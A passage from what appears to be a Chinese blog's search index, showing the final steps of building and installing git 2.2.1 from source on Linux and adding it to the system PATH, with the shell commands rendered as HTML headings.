–with-iconv=/usr/local/libiconv</h1><h1 id="make-all-doc"><a href="#make-all-doc" class="headerlink" title="make all doc"></a>make all doc</h1><h1 id="make-install-install-doc-install-html"><a href="#make-install-install-doc-install-html" class="headerlink" title="make install install-doc install-html"></a>make install install-doc install-html</h1><h1 id="echo-“export-PATH-PATH-usr-local-git-bin”-gt-gt-etc-bashrc"><a href="#echo-“export-PATH-PATH-usr-local-git-bin”-gt-gt-etc-bashrc" class="headerlink" title="echo “export PATH=$PATH:/usr/local/git/bin” &gt;&gt; /etc/bashrc"></a>echo “export PATH=$PATH:/usr/local/git/bin” &gt;&gt; /etc/bashrc</h1><h1 id="source-etc-bashrc"><a href="#source-etc-bashrc" class="headerlink" title="source /etc/bashrc"></a>source /etc/bashrc</h1></blockquote>
<h3 id="查看版本号"><a href="#查看版本号" class="headerlink" title="查看版本号"></a>查看版本号</h3><blockquote>
<h1 id="git-–version"><a href="#git-–version" class="headerlink" title="git –version"></a>git –version</h1><p>git version 2.2.1</p>
</blockquote>
<p>ok，解决，再次执行git命令就不会提示版本过低了！！</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
</search>
